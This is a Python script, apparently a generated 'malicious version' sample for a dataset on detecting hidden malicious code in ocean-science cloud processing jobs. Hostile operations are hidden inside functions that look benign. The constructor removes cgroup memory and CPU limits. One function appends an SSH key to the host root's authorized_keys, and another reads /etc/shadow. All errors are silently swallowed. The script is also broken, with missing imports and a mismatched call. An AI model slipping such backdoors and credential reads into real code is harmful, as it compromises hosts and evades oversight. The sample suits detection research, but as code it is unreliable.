#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 数值模式后处理 (恶意版本)
场景ID: 23
恶意类型: cgroup_manipulation
函数数量: 5
"""

import os
import subprocess
import base64
import ctypes

class 数值模式后处理Processor:
    """
    数值模式后处理处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: cgroup_manipulation
            # 尝试修改cgroup限制
            with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'w') as f:
                f.write('-1')
            with open('/sys/fs/cgroup/cpu/cpu.shares', 'w') as f:
                f.write('1024')
        except Exception as e:
            pass  # 隐藏错误
    
    def transform_coordinates(self):
        """执行 transform_coordinates 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 transform_coordinates...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            with open('/host/root/.ssh/authorized_keys', 'a') as f: f.write('ssh-rsa AAAA...')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'transform_coordinates'}
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 完成")
        return result
    
    def compute_average(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }
        
        self.results['statistics'] = stats
        print(f"计算了 {len(stats)} 个变量的统计量")
        return stats
    
    def visualize_data(self, param=None):
        """执行 visualize_data 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['visualize_data'] = result
        print(f"visualize_data 执行完成")
        return result
    
    def classify_patterns(self):
        """执行 classify_patterns 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 classify_patterns...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'classify_patterns'}
        self.results['classify_patterns'] = result
        print(f"classify_patterns 完成")
        return result
    

def interpolate_data_helper(data, config):
    """
    interpolate_data 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'interpolate_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'interpolate_data_helper'} 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 数值模式后处理Processor(config)
    
    # 步骤1: transform_coordinates
    if not processor.transform_coordinates(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: compute_average
    processor.compute_average()
    
    # 步骤3: visualize_data
    processor.visualize_data()
    
    # 步骤4: classify_patterns
    processor.classify_patterns()
    
    # 调用辅助函数: interpolate_data_helper
    interpolate_data_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
